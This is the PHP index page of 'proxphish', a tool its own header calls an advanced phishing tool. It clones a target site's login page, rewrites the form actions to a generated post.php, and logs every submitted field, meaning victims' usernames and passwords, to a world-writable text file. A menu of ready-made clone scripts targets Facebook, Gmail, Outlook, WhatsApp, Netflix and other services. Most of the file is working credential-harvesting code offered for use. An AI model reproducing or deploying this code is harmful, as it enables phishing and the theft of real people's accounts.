<?php

/*
*  Copyright (c) 2020 Barchampas Gerasimos <makindosxx@gmail.com>.
*  proxphish is a advanced phishing tool.
*
*  proxphish is free software: you can redistribute it and/or modify
*  it under the terms of the GNU Affero General Public License as published by
*  the Free Software Foundation, either version 3 of the License, or
*  (at your option) any later version.
*
*  proxphish is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU Affero General Public License for more details.
*
*  You should have received a copy of the GNU Affero General Public License
*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/


ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);


  session_start();

  clearstatcache();

  opcache_reset();




    $ip_redirection = $_SERVER['SERVER_ADDR'];

  
    require_once('__SRC__/class_redirection.php');

   
   if (class_exists('REDIRECTION_URL_FORCE')) 
    {

    $obj_redirection =  new REDIRECTION_URL_FORCE;    
  

  if ($obj_redirection -> LOCAL_IP[0] === $_SERVER['REMOTE_ADDR'])
    {
  header("Location: http://$ip_redirection");
      }

   else if ($obj_redirection -> LOCAL_IP[1] === $_SERVER['REMOTE_ADDR'])
    {
  header("Location: http://$ip_redirection");
      }



  else if ($obj_redirection -> LOCAL_IP[2] === $_SERVER['REMOTE_ADDR'])
    {
  header("Location: http://$ip_redirection");
    }



   else  if ($obj_redirection -> LOCAL_IP[3] === $_SERVER['REMOTE_ADDR'])
    {
  header("Location: http://$ip_redirection");
      }

   
    
   else
    {    

   error_reporting(0);

   error_reporting(E_ERROR | E_WARNING | E_PARSE);

   error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);

   error_reporting(E_ALL & ~E_NOTICE);

   error_reporting(E_ALL);

   error_reporting(-1);

   ini_set('error_reporting', E_ALL);

   ini_set("display_errors", 1);

      }


   }// end of class REDIRECTION_URL_FORCE exists


?>


<html>
<head>

   <title> ProxPhish </title>
  
  <link rel="icon" type="image/jpg" href="/css/icons/logo.png" />

 <link rel="stylesheet" type="text/css" href="css/index.css">
 
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="Expires" content="0" />

</head>


<body id="body">



 <script type="text/javascript">
$(document).ready(function(){    
    //Check if the current URL contains '#'
    if(document.URL.indexOf("#")==-1){
        // Set the URL to whatever it was plus "#".
        url = document.URL+"#";
        location = "#";

        //Reload the page
        location.reload(true);
    }
});
</script>




<div class="shell-wrap">

 <p class="shell-top-bar"> 
 <?php
  $output = shell_exec('shell/getaway_ip.sh');
    echo "<a class='a' href='/'> ProxPhish </a>";      
  ?>       
  </p>
  
 <br>


  <div align="center">
 <form action="" method="post" id="form1">
  <!--  <font color="black"> <h2> Hack http web sites </h2> </font> -->
  
  <font color="white">  < </font>
     <input type="text" name="ip_addr" id="ip" minlength="7" maxlength="15" placeholder="Ip address of attacker"  autofocus required> 
      <font color="white"> > </font>
      <br><br>
      <font color="white"> < </font> 
 <input type="text" name="site_hack" minlength="7" maxlength="256" placeholder="Enter a web site ec: http://www.website.com"  
   id="site" required>  
        <font color="white"> > </font>
      <br> 
     <br>
   <input type="submit" name="hack" value="Hach this site" id="submit"> 
  </form>
    </div>

     <br>

     <div align="center"> 
      <h3> <font color="white"> Or she used a ready </font> </h3>
     </div>


         <br>



      <div align="center">
    <form method="post" action="">
    
   <select name="site_ready" id="select_site" onchange="this.form.submit()">
   
    <option selected disabled> Ready websites </option>
    
     <optgroup label="Social Media">
    <option value ="https://www.facebook.com">  (&#120125;) &nbsp; Facebook </option>
    <option value ="https://www.twitter.com"> (&#120139;) &nbsp; Twitter </option>
    <option value ="https://www.instagram.com"> (&#120128;) &nbsp; Instagram </option>
    <option value ="https://www.snapchat.com"> (&sect;) &nbsp; Snapchat </option>
      </optgroup>


        <option disabled> </option>

   <optgroup label="Chat">
     <option value ="https://www.messenger.com">  (&#x4D;) &nbsp; Messenger </option>
     <option value ="https://www.telegram.com">  (&Tcaron;) &nbsp; Telegram </option>
     <option value ="https://www.whatsapp.com">  (&Wcirc;) &nbsp; Whatsapp </option>
   </optgroup>


          <option disabled> </option>

   <optgroup label="Other Social Media">
    <option value ="https://www.linkedin.com">  (&Lacute;) &nbsp; Linkedin </option>
    <option value ="https://www.pinterest.com"> (&#503;) &nbsp; Pinterest </option>
      </optgroup>

      
     <option disabled> </option>

       <optgroup label="Email">
    <option value ="https://www.gmail.com"> (&#120126;) &nbsp; Gmail </option>
    <option value ="https://login.live.com"> (&Omacr;) &nbsp; Outlook </option>
    <option value ="https://www.yahoo.com"> (&#120144;) &nbsp; Yahoo </option>
      </optgroup>
      
      <option disabled> </option>
      
        <optgroup label="Companies">
         <option value ="https://www.microsoft.com"> (&#x4D;) &nbsp; Microsoft </option>
         <option value ="https://www.adobe.com"> (&Abreve;) &nbsp; Adobe </option>
      </optgroup>


            <option disabled> </option>
      
        <optgroup label="Video">
         <option value ="https://www.tiktok.com"> (&Tstrok;) &nbsp; Tiktok </option>
      </optgroup>


     <option disabled> </option>
      
        <optgroup label="Tv">
         <option value ="https://www.twitch.com"> (&#428;) &nbsp; Twitch </option>
      </optgroup>

      
          <option disabled> </option>
      
        <optgroup label="Cinema">
         <option value ="https://www.netflix.com"> (&Ncedil;) &nbsp; Netflix </option>
      </optgroup>

     
          <option disabled> </option>
      
        <optgroup label="Music">
         <option value ="https://www.spotify.com"> (&Scaron;) &nbsp; Spotify </option>
       </optgroup>

  
         <option disabled> </option>
      
        <optgroup label="Cms">
         <option value ="https://www.wordpress.com"> (&#1308;) &nbsp; Wordpress </option>
      </optgroup>
      
  </select>
  </form>


<?php

 require_once('__SRC__/class_attack_details.php');

  if (class_exists('ATTACK_DETAILS')) 
    {
     $OBJ_ATTACK_DETAILS = new ATTACK_DETAILS;

     $CONNECTED      =  $OBJ_ATTACK_DETAILS -> DETAILS[0];
     $PROTOCOL_PORT  =  $OBJ_ATTACK_DETAILS -> DETAILS[1];
     $DNS_CONDITION  =  $OBJ_ATTACK_DETAILS -> DETAILS[2];
     $TIME           =  date($OBJ_ATTACK_DETAILS::CONSTANT);   
  
   ob_flush();

    echo"<table>
	  <thead>

           <tr>
	    <th> Connected </th>
            <th> Protocol & port </th>
	    <th> Dns condition </th>
	    <th> Website </th>
	    <th> Time </th>
          </tr>";


   if(isset($_POST['hack']))
    {
     echo" <tr>
	    <th> $CONNECTED </th>
	    <th> $PROTOCOL_PORT </th>
	    <th> $DNS_CONDITION </th>
	    <th> {$_POST['site_hack']}  </th>
	   <th>  $TIME  </th>
          </tr>

	</thead>
       </table>";
       }
 

   else if (isset($_POST['site_ready']))
         {
          echo" <tr>
	    <th> $CONNECTED </th>
	    <th> $PROTOCOL_PORT </th>
	    <th> $DNS_CONDITION </th>
	    <th> {$_POST['site_ready']}  </th>
	   <th>  $TIME  </th>
          </tr>

	</thead>
       </table>";
           }



ob_end_flush();
flush();
usleep(3000000);



 } // end of class exists



	
?>




    </div>


  
    
<!--
  <div id="footer">
   <img src="/css/clone_diagram.jpg" height="250" width="600">
   </div>
  --> 



</body>



</html>



<?php


  require_once('__SRC__/class_tools.php');

  if (class_exists('INPUT_DATA_AVAILABLE')) 
    {
    $obj_data = new INPUT_DATA_AVAILABLE;
      



  if(isset($_POST['hack']))
      {
    
  $ip_addr   = $obj_data-> SAFE_DATA_ENTER($_POST['ip_addr']);
  $site_hack = $obj_data-> SAFE_DATA_ENTER($_POST['site_hack']);


   if (filter_var($ip_addr, FILTER_VALIDATE_IP) == true) 
       {

    $get_ip = shell_exec('./my_ipv4.sh');
 
     if ($get_ip = $ip_addr)
       {


      $_SESSION['site_hack']=$site_hack;
 

     $site_name = "index"; 
    //substr(strrchr($site_hack, "/"), 1);

     $url    = $site_hack;
     $name   = $site_name.'.html';
     $file   = file($url);
     $result = file_put_contents($name, $file);





    $post_data_txt = fopen("export/data.txt", "w") or die("Unable to open file!");
    $lines_data_txt = PHP_EOL;
    fwrite($post_data_txt, $lines_data_txt);
    fclose($post_data_txt);

 
     chmod("/var/www/proxior/export/data.txt", 0777);




    $post_file_php = fopen("post.php", "w") or die("Unable to open file!");
    $lines_php = '<?php $file = "export/data.txt";' .PHP_EOL
      .'file_put_contents($file, print_r($_POST, true), FILE_APPEND);' .PHP_EOL
      . 'file_put_contents($file, print_r("<hr/>\n", true), FILE_APPEND);' .PHP_EOL
      .'?>'
      .PHP_EOL
      .'<html>
      <head>
      </head>
      <body style="background-image:url(css/error.png); background-repeat: no-repeat; background-size: auto; background-position:center; background-color: #f7f7f7;">
      </body>
      </html>';

    fwrite($post_file_php, $lines_php);
    fclose($post_file_php);

      #."<meta http-equiv='refresh' content='0; url=$site_hack'/>";

      chmod("/var/www/proxior/post.php", 0777);




      chmod("/var/www/proxior/index.html", 0777);


  $path_to_file = 'index.html';
  $file_contents = file_get_contents($path_to_file);
  $file_contents = str_replace('action="','action="post.php" " ',$file_contents);
  file_put_contents($path_to_file,$file_contents);


 // echo '<script type="text/javascript">alert("The website hack successfully");
  //       </script>';
          echo ("<script>location.href='dns.php'</script>");

          } // end of parity ip


          else if ($get_ip != $ip_addr)
            { 
         echo '<script type="text/javascript">alert("Ipv4 it does not fit");
         </script>';
              }


         }// end of filter validate ip


   else if (filter_var($ip_addr, FILTER_VALIDATE_IP) != true)
     {
echo '<script type="text/javascript">alert("The website hack fail: Try again");
         </script>';
     echo ("<script>location.href='index.php'</script>");
      }   



 } // end of isset







  // isset for ready web sites

 else if(isset($_POST['site_ready']))
   {

    $site_ready = $obj_data-> SAFE_DATA_ENTER($_POST['site_ready']);


      $_SESSION['site_ready'] = $site_ready; 
  

      $post_data_txt_site_ready = fopen("export/data.txt", "w");
      chmod("/var/www/proxphish/export/data.txt", 0777);



     // SOCIAL MEDIA

    if ($site_ready=='https://www.facebook.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./facebook.sh');

 

   // echo '<script type="text/javascript">alert("Facebook hack successfully");
    //  </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of facebook




     else if ($site_ready=='https://www.twitter.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./twitter.sh');


   // echo '<script type="text/javascript">alert("Twitter hack successfully");
   //   </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of twitter




      else if ($site_ready=='https://www.instagram.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./instagram.sh');



   // echo '<script type="text/javascript">alert("Instagram hack successfully");
   //   </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of instagram





     else if ($site_ready=='https://www.snapchat.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./snapchat.sh');


   // echo '<script type="text/javascript">alert("Snapchat hack successfully");
   //   </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of snapchat




     //CHAT

      else if ($site_ready=='https://www.messenger.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./messenger.sh');



   // echo '<script type="text/javascript">alert("Messenger hack successfully");
   //   </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of messenger


 
    else if ($site_ready=='https://www.telegram.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./telegram.sh');



   // echo '<script type="text/javascript">alert("Telegram hack successfully");
   //   </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of telegram



   else if ($site_ready=='https://www.whatsapp.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./whatsapp.sh');



   // echo '<script type="text/javascript">alert("Whatsapp hack successfully");
   //   </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of whatsapp





     //OTHER SOCIAL MEDIA
     
  else if ($site_ready=='https://www.linkedin.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./linkedin.sh');
    

   // echo '<script type="text/javascript">alert("Linkedin hack successfully");
    //  </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of linkedin
     
     

     else if ($site_ready=='https://www.pinterest.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./pinterest.sh');


   // echo '<script type="text/javascript">alert("Pinterest hack successfully");
   //   </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of pinterest

     
     

     
      // EMAILS

     else if ($site_ready=='https://www.gmail.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./gmail.sh');



    // echo '<script type="text/javascript">alert("Gmail hack successfully");
    //  </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of gmail




      else if ($site_ready=='https://login.live.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./outlook.sh');



   // echo '<script type="text/javascript">alert("Hotmail hack successfully");
   //   </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of outlook






    else if ($site_ready=='https://www.yahoo.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./yahoo.sh');



   // echo '<script type="text/javascript">alert("Yahoo hack successfully");
   //   </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of yahoo





     //COMPANIES
     
  else if ($site_ready=='https://www.microsoft.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./microsoft.sh');
    

   // echo '<script type="text/javascript">alert("Microsoft hack successfully");
    //  </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of microsoft
    
     
     
  else if ($site_ready=='https://www.adobe.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./adobe.sh');
    

   // echo '<script type="text/javascript">alert("Adobe hack successfully");
    //  </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of adobe
    



 
     //VIDEO

    else if ($site_ready=='https://www.tiktok.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./tiktok.sh');
    

   // echo '<script type="text/javascript">alert("Tiktok hack successfully");
    //  </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of tiktok
     





      //TV

    else if ($site_ready=='https://www.twitch.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./twitch.sh');
    

   // echo '<script type="text/javascript">alert("Twitch hack successfully");
    //  </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of twitch





    //CINEMA

    else if ($site_ready=='https://www.netflix.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./netflix.sh');
    

   // echo '<script type="text/javascript">alert("Netflix hack successfully");
    //  </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of netflix
    
   


    //MUSIC

    else if ($site_ready=='https://www.spotify.com')
       {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./spotify.sh');
    

   // echo '<script type="text/javascript">alert("Spotify hack successfully");
    //  </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of spotify
    


  


    //CMS

    else if ($site_ready=='https://www.wordpress.com')
         {

    shell_exec('shell/./permissions.sh');
    shell_exec('shell/./wordpress.sh');
    

   // echo '<script type="text/javascript">alert("Spotify hack successfully");
    //  </script>';
     echo ("<script>location.href='dns.php'</script>");
     

    } // end if of wordpress   




    } // end of else if isset for ready web sites


  

  } // end of if exists class tools


?>
